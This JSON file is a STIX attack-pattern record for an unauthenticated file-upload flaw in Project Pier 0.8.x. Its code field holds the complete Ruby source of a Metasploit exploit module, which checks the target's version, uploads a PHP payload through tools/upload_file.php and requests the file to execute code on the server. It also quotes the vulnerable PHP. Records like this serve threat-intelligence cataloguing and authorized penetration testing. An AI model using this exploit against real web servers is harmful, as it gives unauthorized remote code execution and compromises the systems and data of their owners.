{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e8c68868-43ad-4e76-b2d9-1f9623956db8",
    "created": "2024-08-14T17:12:00.16363Z",
    "modified": "2024-08-14T17:12:00.163635Z",
    "name": "\"Project Pier Arbitrary File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability found in Project Pier.  The application's uploading tool does not require any authentication, which allows a malicious user to upload an arbitrary file onto the web server, and then cause remote code execution by simply requesting it. This module is known to work against Apache servers due to the way it handles an extension name, but the vulnerability may not be exploitable on others.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/projectpier_upload_exec.rb",
            "external_id": "projectpier_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Project Pier Arbitrary File Upload Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Project Pier.  The application's\n        uploading tool does not require any authentication, which allows a malicious user\n        to upload an arbitrary file onto the web server, and then cause remote code\n        execution by simply requesting it. This module is known to work against Apache\n        servers due to the way it handles an extension name, but the vulnerability may\n        not be exploitable on others.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'BlackHawk',\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '85881'],\n          ['EDB', '21929'],\n          ['PACKETSTORM', '117070']\n        ],\n      'Platform'       => %w{ linux php },\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],\n          [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]\n        ],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-10-08',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the web application', '/pp088/'])\n      ])\n  end\n\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri'    => normalize_uri(\"#{base}/index.php\"),\n        'vars_get' =>\n          {\n            'c' => 'access',\n            'a' => 'login'\n          }\n      })\n\n    if res and res.body =~ /Welcome to ProjectPier 0\\.8\\.[0-8]/ and res.headers['Server'] =~ /^Apache/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def upload_php(base, fname, php_payload, folder_name)\n    data = Rex::MIME::Message.new\n    data.add_part(folder_name, nil, nil, 'form-data; name=\"folder\"')\n    data.add_part(php_payload, nil, nil, \"form-data; name=file; filename=\\\"#{fname}\\\"\")\n    data.add_part('', nil, nil, 'form-data; name=\"part\"')\n    data.add_part('Submit', nil, nil, 'form-data; name=\"submit\"')\n\n    post_data = data.to_s\n\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => \"#{base}/tools/upload_file.php\",\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => post_data\n    })\n\n    return res.body if res\n  end\n\n  def exec_php(base, body)\n    # Body example:\n    # 0 ./upload/test/test.txt-0001\n    uri = body.scan(/(\\/.+$)/).flatten[0]\n\n    res = send_request_raw({'uri' => \"#{base}/tools#{uri}\"})\n\n    if res and res.code == 404\n      print_error(\"The upload most likely failed\")\n      return\n    end\n\n    handler\n  end\n\n  def exploit\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    # Don't create a directory on the target since it complicates\n    # cleaning up after ourselves\n    #folder_name = Rex::Text.rand_text_alpha(4)\n    folder_name = \"\"\n    php_fname = \"#{Rex::Text.rand_text_alpha(5)}.php.1\"\n    @clean_files = []\n\n    p = get_write_exec_payload(:unlink_self=>true)\n\n    print_status(\"Uploading PHP payload (#{p.length.to_s} bytes)...\")\n    res = upload_php(base, php_fname, p, folder_name)\n\n    if not res\n      print_error(\"No response from server\")\n      return\n    end\n\n    print_status(\"Executing '#{php_fname}'...\")\n    exec_php(base, res)\n  end\nend\n\n=begin\nRelevant code from tools/upload_file.php\n\n    $folder = rtrim( './upload/' . $_POST['folder'] , '/');\n    mkdir($folder, 0777, true);\n\n    $seq = str_pad((int) $_POST[\"part\"],4,\"0\",STR_PAD_LEFT);\n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\n    $folder . '/' . $_FILES[\"file\"][\"name\"] . '-' . $seq );\n\nNote that it stores the uploaded files in tools/upload/ not upload/\n\n=end\n",
    "x_mitre_disclosure_date": "2012-10-08",
    "x_mitre_platforms": [
        "%w{ linux php }"
    ]
}